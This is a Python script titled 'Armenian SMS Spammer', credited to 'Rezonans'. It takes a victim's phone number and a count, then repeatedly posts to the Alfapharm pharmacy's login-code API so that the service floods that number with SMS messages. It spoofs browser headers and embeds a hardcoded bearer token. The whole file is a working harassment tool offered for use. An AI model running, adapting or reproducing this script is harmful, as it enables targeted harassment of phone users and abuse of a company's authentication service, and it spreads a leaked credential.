import requests
def alfapharm(number):
    value = 0;
    try:
        data = '{"fromForgot":false,"number":"' + number + '"}'
        headers = {
            'authority': 'api.alfapharm.am',
            'sec-ch-ua': '"Chromium";v="94", "Google Chrome";v="94", ";Not A Brand";v="99"',
            'language': 'hy',
            'sec-ch-ua-mobile': '?0',
            'authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhYjEzYmMwMC1lYWJlLTRjOWEtYTIwMC04OWRiMGYxOTUyMDgiLCJ1bmlxdWVfbmFtZSI6ImFiMTNiYzAwLWVhYmUtNGM5YS1hMjAwLTg5ZGIwZjE5NTIwOCIsImp0aSI6IjkyZmU2NTIyLTdiMzYtNGEyMS1iYTFiLTJmZjY5YjYzNzcyNSIsImlhdCI6MTYzMzI1NjAyMSwibmJmIjoxNjMzMjU2MDIwLCJleHAiOjE2NjQ3OTIwMjAsImlzcyI6IndlYkFwaSIsImF1ZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NTAwMC8ifQ.H35uXMT978C_eWAb3EFc0vgGbI2e85omZ_pepSAZj3w',
            'content-type': 'application/json',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36',
            'ostype': '3',
            'sec-ch-ua-platform': '"Windows"',
            'accept': '*/*',
            'origin': 'https://alfapharm.am',
            'sec-fetch-site': 'same-site',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://alfapharm.am/',
            'accept-language': 'en-US,en;q=0.9',
        }
        response = requests.post('https://api.alfapharm.am/api/auth/code', headers=headers, data=data)
        value = 1
    except:
        value = 0
    return value


bn="""
  ______   _______   __       __  ________  __    __  ______   ______   __    __ 
 /      \ /       \ /  \     /  |/        |/  \  /  |/      | /      \ /  \  /  |
/$$$$$$  |$$$$$$$  |$$  \   /$$ |$$$$$$$$/ $$  \ $$ |$$$$$$/ /$$$$$$  |$$  \ $$ |
$$ |__$$ |$$ |__$$ |$$$  \ /$$$ |$$ |__    $$$  \$$ |  $$ |  $$ |__$$ |$$$  \$$ |
$$    $$ |$$    $$< $$$$  /$$$$ |$$    |   $$$$  $$ |  $$ |  $$    $$ |$$$$  $$ |
$$$$$$$$ |$$$$$$$  |$$ $$ $$/$$ |$$$$$/    $$ $$ $$ |  $$ |  $$$$$$$$ |$$ $$ $$ |
$$ |  $$ |$$ |  $$ |$$ |$$$/ $$ |$$ |_____ $$ |$$$$ | _$$ |_ $$ |  $$ |$$ |$$$$ |
$$ |  $$ |$$ |  $$ |$$ | $/  $$ |$$       |$$ | $$$ |/ $$   |$$ |  $$ |$$ | $$$ |
$$/   $$/ $$/   $$/ $$/      $$/ $$$$$$$$/ $$/   $$/ $$$$$$/ $$/   $$/ $$/   $$/ 
                                                                               
                                                                                 
  ______   __       __   ______                                                  
 /      \ /  \     /  | /      \                                                 
/$$$$$$  |$$  \   /$$ |/$$$$$$  |                                                
$$ \__$$/ $$$  \ /$$$ |$$ \__$$/                                                 
$$      \ $$$$  /$$$$ |$$      \                                                 
 $$$$$$  |$$ $$ $$/$$ | $$$$$$  |                                                
/  \__$$ |$$ |$$$/ $$ |/  \__$$ |                                                
$$    $$/ $$ | $/  $$ |$$    $$/                                                 
 $$$$$$/  $$/      $$/  $$$$$$/                                                  

                                                                                 
    
  ______   _______    ______   __       __  __       __  ________  _______       
 /      \ /       \  /      \ /  \     /  |/  \     /  |/        |/       \      
/$$$$$$  |$$$$$$$  |/$$$$$$  |$$  \   /$$ |$$  \   /$$ |$$$$$$$$/ $$$$$$$  |     
$$ \__$$/ $$ |__$$ |$$ |__$$ |$$$  \ /$$$ |$$$  \ /$$$ |$$ |__    $$ |__$$ |     
$$      \ $$    $$/ $$    $$ |$$$$  /$$$$ |$$$$  /$$$$ |$$    |   $$    $$<      
 $$$$$$  |$$$$$$$/  $$$$$$$$ |$$ $$ $$/$$ |$$ $$ $$/$$ |$$$$$/    $$$$$$$  |     
/  \__$$ |$$ |      $$ |  $$ |$$ |$$$/ $$ |$$ |$$$/ $$ |$$ |_____ $$ |  $$ |     
$$    $$/ $$ |      $$ |  $$ |$$ | $/  $$ |$$ | $/  $$ |$$       |$$ |  $$ |     
 $$$$$$/  $$/       $$/   $$/ $$/      $$/ $$/      $$/ $$$$$$$$/ $$/   $$/   


 _                     ____                                     
| |__  _   _          |  _ \ ___ _______  _ __   __ _ _ __  ___ 
| '_ \| | | |         | |_) / _ \_  / _ \| '_ \ / _` | '_ \/ __|
| |_) | |_| |         |  _ <  __// / (_) | | | | (_| | | | \__ \ 
|_.__/ \__, |         |_| \_\___/___\___/|_| |_|\__,_|_| |_|___/
       |___/                                                    



(Telegram - @cryptojacker) Made by Rezonans


"""


# For printing banner
print(bn)

number = input("\n\nEnter phone number (Example 098100100):\t")
count = int(input("\nEnter count (Recommented from 10 to 100):\t"))
number = "+374" + number[1:]
print("\n")
failed = 0
sended = 0
for x in range(count):
	value = alfapharm(number)
	if value==1:
		print(f"[+]One sms has been sent[+]\t[{x+1} from {count}]")
		sended+=1
	else:
		print(f"[-]Error while sending sms[-]\t[{x+1} from {count}]")
		failed+=1
print(f"\n{sended} sms from {count} has been sent successfully")
print(f"{sended} - sended")
print(f"{failed} - failed")
input()
